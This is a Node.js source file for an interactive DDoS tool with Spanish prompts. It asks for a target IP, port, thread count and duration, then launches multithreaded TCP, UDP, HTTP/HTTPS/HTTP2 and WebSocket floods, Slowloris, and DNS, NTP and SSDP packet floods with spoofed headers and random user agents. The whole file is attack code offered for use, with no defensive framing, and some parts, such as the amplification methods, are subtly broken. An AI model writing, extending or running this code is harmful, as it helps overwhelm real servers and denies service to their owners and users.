#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const WebSocket = require('ws');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');

const MAX_WORKERS = 16;
const ATTACK_METHODS = {
    TCP_FLOOD: 'tcpFlood',
    UDP_FLOOD: 'udpFlood',
    HTTP_FLOOD: 'httpFlood',
    HTTPS_FLOOD: 'httpsFlood',
    HTTP2_FLOOD: 'http2Flood',
    WEBSOCKET_FLOOD: 'websocketFlood',
    SLOWLORIS: 'slowloris',
    DNS_AMP: 'dnsAmplification',
    NTP_AMP: 'ntpAmplification',
    SSDP_AMP: 'ssdpAmplification'
};

class UltimateDDoSAttack {
    constructor() {
        this.config = {
            payloads: {
                tcp: this._generatePayload(1024),
                udp: this._generatePayload(65507),
                http: this._generateHttpHeaders(),
                dns: this._generateDnsQuery(),
                ntp: this._generateNtpPacket(),
                ssdp: this._generateSsdpRequest()
            },
            timeout: 2000,
            workerPool: []
        };

        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            bandwidth: 0,
            startTime: 0
        };

        this.running = false;
        this.animationFrames = ['⣷', '⣯', '⣟', '⡿', '⢿', '⣻', '⣽', '⣾'];
    }

    _generatePayload(size) {
        const buf = Buffer.alloc(size);
        randomFillSync(buf);
        return buf;
    }

    _generateHttpHeaders() {
        return [
            'GET /' + randomBytes(8).toString('hex') + ' HTTP/1.1',
            'Host: ' + workerData.target,
            'User-Agent: ' + this._randomUserAgent(),
            'Accept: */*',
            'Connection: keep-alive',
            'X-Forwarded-For: ' + this._randomIp(),
            '\r\n'
        ].join('\r\n');
    }

    _randomUserAgent() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    _randomIp() {
        return Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.');
    }

    _generateDnsQuery() {
        const domain = randomBytes(8).toString('hex') + '.com';
        return Buffer.from([
            0xAA, 0xAA, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, domain.length, ...Buffer.from(domain),
            0x00, 0x00, 0x01, 0x00, 0x01
        ]);
    }

    _generateNtpPacket() {
        const packet = Buffer.alloc(48);
        packet[0] = 0x1B;
        return packet;
    }

    _generateSsdpRequest() {
        return Buffer.from(
            'M-SEARCH * HTTP/1.1\r\n' +
            'HOST: 239.255.255.250:1900\r\n' +
            'MAN: "ssdp:discover"\r\n' +
            'MX: 1\r\n' +
            'ST: ssdp:all\r\n' +
            '\r\n'
        );
    }

    startAttack(target, port, threads, duration, methods) {
        if (this.running) return;
        
        this.running = true;
        this.stats.startTime = performance.now();

        if (isMainThread) {
            console.log(chalk.green(`\n[+] Iniciando ataque a ${target}:${port}`));
            this._startWorkers(target, port, threads, duration, methods);
            this._showStats();
            setTimeout(() => this.stop(), duration * 1000);
        } else {
            this._executeFlood(workerData.target, workerData.port, workerData.threads, workerData.methods);
        }
    }

    _startWorkers(target, port, threads, duration, methods) {
        const cpuCores = Math.min(require('os').cpus().length, MAX_WORKERS);
        const threadsPerWorker = Math.ceil(threads / cpuCores);

        for (let i = 0; i < cpuCores; i++) {
            const worker = new Worker(__filename, {
                workerData: { target, port, threads: threadsPerWorker, methods }
            });

            worker.on('message', (msg) => {
                this.stats.total += msg.total;
                this.stats.success += msg.success;
                this.stats.failed += msg.failed;
                this.stats.bandwidth += msg.bandwidth;
            });

            this.config.workerPool.push(worker);
        }
    }

    _executeFlood(target, port, threads, methods) {
        methods.forEach(method => {
            for (let i = 0; i < threads; i++) {
                this[method](target, port);
            }
        });
    }

    [ATTACK_METHODS.TCP_FLOOD](target, port) {
        const socket = new net.Socket();
        socket.connect(port, target, () => {
            socket.write(this.config.payloads.tcp);
            this._reportStats('success', this.config.payloads.tcp.length);
            socket.destroy();
        }).on('error', () => this._reportStats('failed', 0));
    }

    [ATTACK_METHODS.UDP_FLOOD](target, port) {
        const socket = dgram.createSocket('udp4');
        socket.send(this.config.payloads.udp, port, target, (err) => {
            err ? this._reportStats('failed', 0) 
                : this._reportStats('success', this.config.payloads.udp.length);
            socket.close();
        });
    }

    [ATTACK_METHODS.HTTP_FLOOD](target, port) {
        const req = http.request(`http://${target}:${port}`, {
            method: 'GET',
            headers: this.config.payloads.http
        }, (res) => {
            res.on('data', (d) => this._reportStats('success', d.length));
            res.on('end', () => this._reportStats('success', 0));
        }).on('error', () => this._reportStats('failed', 0));
        req.end();
    }

    [ATTACK_METHODS.HTTPS_FLOOD](target, port) {
        const req = https.request(`https://${target}:${port}`, {
            method: 'POST',
            headers: { 'Content-Length': this.config.payloads.tcp.length },
            rejectUnauthorized: false
        }, (res) => {
            res.on('data', (d) => this._reportStats('success', d.length));
        }).on('error', () => this._reportStats('failed', 0));
        req.end(this.config.payloads.tcp);
    }

    [ATTACK_METHODS.HTTP2_FLOOD](target, port) {
        const client = http2.connect(`https://${target}:${port}`, { rejectUnauthorized: false });
        const req = client.request({ ':path': `/?${randomBytes(8).toString('hex')}` });
        req.on('data', (d) => this._reportStats('success', d.length));
        req.on('end', () => this._reportStats('success', 0));
        req.end();
    }

    [ATTACK_METHODS.WEBSOCKET_FLOOD](target, port) {
        const ws = new WebSocket(`ws://${target}:${port}`);
        ws.on('open', () => {
            ws.send(this.config.payloads.tcp);
            this._reportStats('success', this.config.payloads.tcp.length);
            ws.close();
        }).on('error', () => this._reportStats('failed', 0));
    }

    [ATTACK_METHODS.SLOWLORIS](target, port) {
        const socket = net.connect(port, target);
        socket.write(`GET / HTTP/1.1\r\nHost: ${target}\r\n`);
        setInterval(() => {
            socket.write(`X-${randomBytes(4).toString('hex')}: ${Math.random()}\r\n`);
        }, 15000);
        socket.on('error', () => this._reportStats('failed', 0));
    }

    [ATTACK_METHODS.DNS_AMP](target, port) {
        const socket = dgram.createSocket('udp4');
        socket.send(this.config.payloads.dns, port, target, (err) => {
            err ? this._reportStats('failed', 0) 
                : this._reportStats('success', this.config.payloads.dns.length);
            socket.close();
        });
    }

    [ATTACK_METHODS.NTP_AMP](target, port) {
        const socket = dgram.createSocket('udp4');
        socket.send(this.config.payloads.ntp, port, target, (err) => {
            err ? this._reportStats('failed', 0) 
                : this._reportStats('success', this.config.payloads.ntp.length);
            socket.close();
        });
    }

    [ATTACK_METHODS.SSDP_AMP](target, port) {
        const socket = dgram.createSocket('udp4');
        socket.send(this.config.payloads.ssdp, port, target, (err) => {
            err ? this._reportStats('failed', 0) 
                : this._reportStats('success', this.config.payloads.ssdp.length);
            socket.close();
        });
    }

    _reportStats(type, bytes) {
        if (!this.running) return;
        
        const stats = {
            total: 1,
            success: type === 'success' ? 1 : 0,
            failed: type === 'failed' ? 1 : 0,
            bandwidth: bytes
        };

        if (isMainThread) {
            Object.entries(stats).forEach(([key, value]) => this.stats[key] += value);
        } else {
            parentPort.postMessage(stats);
        }
    }

    _showStats() {
        if (!this.running) return;
        
        const elapsed = (performance.now() - this.stats.startTime) / 1000;
        const anim = this.animationFrames[Math.floor(elapsed * 10) % this.animationFrames.length];
        const rps = (this.stats.total / elapsed).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 / 1024 / 1024).toFixed(3);

        process.stdout.write(chalk`\r{green ${anim}} ` +
            chalk`{white Tiempo:} {greenBright ${elapsed.toFixed(1)}s} ` +
            chalk`{white Solicitudes:} {cyan ${this.stats.total}} ` +
            chalk`{white SPS:} {cyan ${rps}} ` +
            chalk`{white BW:} {cyan ${bw}GB} ` +
            chalk`({green ${this.stats.success}}|{red ${this.stats.failed}})`
        );

        setTimeout(() => this._showStats(), 100);
    }

    stop() {
        if (!this.running) return;
        
        this.running = false;
        this.config.workerPool.forEach(w => w.terminate());
        console.log(chalk`\n\n{yellow [!] Ataque finalizado}`);
        process.exit();
    }
}

// Interfaz de usuario
if (isMainThread) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const attack = new UltimateDDoSAttack();
    
    rl.question(chalk.greenBright('IP objetivo: '), ip => {
        rl.question(chalk.greenBright('Puerto objetivo: '), port => {
            rl.question(chalk.greenBright('Hilos (recomendado 500-2000): '), threads => {
                rl.question(chalk.greenBright('Duración (segundos): '), duration => {
                    rl.question(chalk.greenBright('Métodos (separados por coma): '), methods => {
                        const selectedMethods = methods.split(',')
                            .filter(m => Object.values(ATTACK_METHODS).includes(m.trim()))
                            .map(m => m.trim());
                        
                        attack.startAttack(
                            ip,
                            parseInt(port),
                            Math.min(parseInt(threads), 2000),
                            Math.min(parseInt(duration), 1800),
                            selectedMethods.length ? selectedMethods : Object.values(ATTACK_METHODS)
                        );
                    });
                });
            });
        });
    });
}